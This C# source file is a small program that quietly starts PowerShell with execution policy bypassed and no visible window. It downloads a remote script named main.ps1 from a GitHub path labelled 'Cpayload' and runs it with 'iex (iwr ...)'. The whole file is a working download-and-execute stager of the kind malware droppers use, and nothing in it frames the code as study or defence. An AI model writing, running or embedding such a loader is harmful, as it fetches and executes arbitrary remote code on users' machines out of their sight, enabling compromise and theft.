using System;
using System.Diagnostics;

namespace PowerShellExecution
{
    class Program
    {
        static void Main()
        {
            string url = "https://raw.githubusercontent.com/43a1723/test/main/Extras/Cpayload/main.ps1";
            string psCommand = $"iex (iwr {url} -UseBasicP)";

            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{psCommand}\"",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(startInfo))
            {
                // Output and error streams can be captured if needed
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                // Optionally, you can log or process the output and error
                // Console.WriteLine(output); // Uncomment to see the output
                // Console.WriteLine(error);  // Uncomment to see any errors
            }
        }
    }
}
